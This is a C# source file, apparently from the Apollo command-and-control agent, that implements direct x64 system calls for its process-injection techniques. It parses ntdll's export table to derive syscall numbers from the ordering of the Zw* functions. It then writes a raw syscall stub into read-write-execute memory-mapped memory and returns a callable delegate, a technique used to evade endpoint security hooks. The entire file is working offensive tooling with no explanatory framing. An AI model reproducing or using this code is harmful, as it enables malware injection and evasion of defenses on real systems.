using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Runtime.InteropServices;
using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;
using static Injection.Shared.Win32;
/*
 * Based heavily off the work of @winternl
 */

namespace Injection.Techniques.Syscall_x64
{
    internal unsafe class USysCall64
    {
        private IAgent _agent;
        private delegate long LdrGetDllHandle(
            IntPtr pwPath,
            IntPtr pwReserved,
            ref UNICODE_STRING pszModule,
            ref UIntPtr lpHandle);


        private readonly Dictionary<string, uint> SysCallTable;

        // TODO: Stack alignment
        private static readonly byte[] SysCallStub =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, sys_no
            0x0F, 0x05,                     // syscall
            0xC3                            // retn
        };

        private LdrGetDllHandle _pLdrGetDllHandle;
        
        public USysCall64(IAgent agent)
        {
            _agent = agent;
            _pLdrGetDllHandle = _agent.GetApi().GetLibraryFunction<LdrGetDllHandle>(
                Library.NTDLL, "LdrGetDllHandle");
            UNICODE_STRING szNtdll = new UNICODE_STRING("ntdll");
            UIntPtr ptrNtdll = UIntPtr.Zero;

            long ntstatus = _pLdrGetDllHandle(
            IntPtr.Zero,
            IntPtr.Zero,
            ref szNtdll,
            ref ptrNtdll);

            if (ntstatus != 0)
            {
                throw new Win32Exception("Failed to get handle of NTDLL");
            }

            byte* lpNtdll = (byte*)ptrNtdll;
            IMAGE_DOS_HEADER* piDH = (IMAGE_DOS_HEADER*)lpNtdll;
            IMAGE_OPTIONAL_HEADER64* piOH = (IMAGE_OPTIONAL_HEADER64*)(lpNtdll + piDH->e_lfanew + 0x18);
            IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)(lpNtdll + piOH->ExportTable.VirtualAddress);

            uint* names = (uint*)(lpNtdll + exportDir->AddressOfNames);
            uint* functions = (uint*)(lpNtdll + exportDir->AddressOfFunctions);
            ushort* ordinals = (ushort*)(lpNtdll + exportDir->AddressOfNameOrdinals);

            var listOfNames = new List<string>();

            var dictOfZwFunctions = new Dictionary<string, ulong>();

            for (int i = 0; i < exportDir->NumberOfNames; i++)
            {
                var name = Marshal.PtrToStringAnsi(new IntPtr(lpNtdll + names[i]));

                if (!name.StartsWith("Zw"))
                {
                    continue;
                }

                var fnAddr = new UIntPtr(lpNtdll + functions[ordinals[i]]);

                dictOfZwFunctions.Add(name, fnAddr.ToUInt64());
            }

            var sortedByAddr = dictOfZwFunctions
                .OrderBy(x => x.Value)
                .ToDictionary(x => "Nt" + x.Key.Substring(2, x.Key.Length - 2), x => x.Value);

            var sysCallLookup = new Dictionary<string, uint>();

            uint sysNo = 0;

            foreach (var entry in sortedByAddr)
            {
                sysCallLookup.Add(entry.Key, sysNo);
                sysNo++;
            }

            SysCallTable = sysCallLookup;
        }
        
        private static byte[] GetSysCallStub(uint sysNo)
        {
            byte[] locBuffer = new byte[SysCallStub.Length];
            byte[] no = BitConverter.GetBytes(sysNo);

            SysCallStub.CopyTo(locBuffer, 0);
            Buffer.BlockCopy(no, 0, locBuffer, 4, 4);
            return locBuffer;
        }
        
        public T MarshalNtSyscall<T>(string functionName) where T : Delegate
        {
            byte[] syscallStub = GetSysCallStub(SysCallTable[functionName]);
            var mapName = Guid.NewGuid().ToString();
            var mapFile =
                MemoryMappedFile.CreateNew(mapName, syscallStub.Length, MemoryMappedFileAccess.ReadWriteExecute);
            var mapView = mapFile.CreateViewAccessor(0, syscallStub.Length, MemoryMappedFileAccess.ReadWriteExecute);

            mapView.WriteArray(0, syscallStub, 0, syscallStub.Length);
            byte* ptrShellcode = (byte*) IntPtr.Zero;
            mapView.SafeMemoryMappedViewHandle.AcquirePointer(ref ptrShellcode);
            return (T) Marshal.GetDelegateForFunctionPointer((IntPtr) ptrShellcode, typeof(T));
        }
    }
}